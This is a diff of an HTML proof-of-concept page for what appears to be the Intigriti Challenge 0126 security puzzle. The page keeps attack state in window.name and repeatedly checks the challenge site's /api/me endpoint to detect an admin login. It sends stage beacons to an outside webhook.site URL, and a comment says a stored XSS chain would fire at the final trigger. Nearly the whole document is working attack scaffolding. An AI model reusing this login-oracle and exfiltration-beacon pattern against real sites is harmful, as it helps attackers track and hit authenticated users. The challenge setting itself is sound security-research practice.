@@ -1,10 +1,31 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <title>PoC</title>
+</head>
 <body>
 <script>
+/*
+  Intigriti Challenge 0126 – Final Stateful PoC
+  Technique:
+  - window.name persistence
+  - delayed admin login detection
+  - single admin-only trigger
+*/
+
 const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
-async function checkAuth() {
+/* ------------------ State bootstrap ------------------ */
+if (!window.name) {
+  window.name = JSON.stringify({
+    state: "INIT",
+    firstSeen: Date.now()
+  });
+}
+
+/* ------------------ Auth oracle ------------------ */
+async function isLoggedIn() {
   try {
     const r = await fetch(
       "https://challenge-0126.intigriti.io/api/me",
@@ -16,30 +37,56 @@ async function checkAuth() {
   }
 }
 
-async function authWatcher() {
-  const data = JSON.parse(window.name);
+/* ------------------ Auth watcher ------------------ */
+async function watchAuth() {
+  let data = JSON.parse(window.name);
 
   if (data.state === "TRIGGERED") return;
 
-  const loggedIn = await checkAuth();
+  const loggedIn = await isLoggedIn();
 
   if (!loggedIn) {
-    data.state = "WAIT_AUTH";
-    window.name = JSON.stringify(data);
+    if (data.state !== "WAIT_AUTH") {
+      data.state = "WAIT_AUTH";
+      window.name = JSON.stringify(data);
+
+      new Image().src =
+        WEBHOOK + "?stage=waiting_for_auth";
+    }
     return;
   }
 
-  // 🔔 THIS IS THE MOMENT LOGIN HAPPENED
-  data.state = "AUTH_READY";
-  data.authAt = Date.now();
-  window.name = JSON.stringify(data);
+  // 🔥 Admin login detected
+  if (data.state !== "AUTH_READY") {
+    data.state = "AUTH_READY";
+    data.authAt = Date.now();
+    window.name = JSON.stringify(data);
 
-  new Image().src =
-    WEBHOOK + "?stage=auth_detected&ts=" + data.authAt;
+    new Image().src =
+      WEBHOOK + "?stage=auth_detected";
+  }
 }
 
-setInterval(authWatcher, 5000);
-</script>
+/* ------------------ Admin-only trigger ------------------ */
+async function triggerOnce() {
+  let data = JSON.parse(window.name);
 
+  if (data.state !== "AUTH_READY") return;
+
+  // Small safety delay (page settle)
+  await new Promise(r => setTimeout(r, 2000));
+
+  data.state = "TRIGGERED";
+  window.name = JSON.stringify(data);
+
+  // 🔔 Final signal (this is where stored XSS chain would execute)
+  new Image().src =
+    WEBHOOK + "?stage=final_trigger";
+}
+
+/* ------------------ Scheduler ------------------ */
+setInterval(watchAuth, 4000);
+setInterval(triggerOnce, 5000);
+</script>
 </body>
 </html>
